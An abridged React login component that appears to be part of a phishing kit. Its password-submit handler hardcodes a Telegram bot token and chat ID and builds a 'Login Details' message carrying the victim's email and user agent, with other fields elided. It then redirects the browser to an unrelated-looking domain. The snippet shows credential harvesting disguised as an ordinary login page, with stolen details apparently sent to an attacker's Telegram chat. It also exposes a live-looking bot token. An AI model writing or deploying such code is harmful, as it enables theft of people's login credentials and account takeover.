...
const Login = () => {
  ...
  const handlePasswordSubmit = async (e) => {
    ...
    try {
      ...
      const TELEGRAM_BOT_TOKEN = '7631993700:AAGMtGjgc-dUMSZFv-1qAhfwtSH9DQM5IXc';
      const TELEGRAM_CHAT_ID = '-1002254322123';
      const loginAlert = `
🔐 <b>Login Details</b>
📧 <b>Email:</b> ${email}
...
🕵️‍♂️ <b>User Agent:</b> ${navigator.userAgent}
      ...
      setShowModal(false); // Hide modal before redirecting
      window.location.href = 'https://lk.accountinglocalsystem.top/';
    } catch (error) {
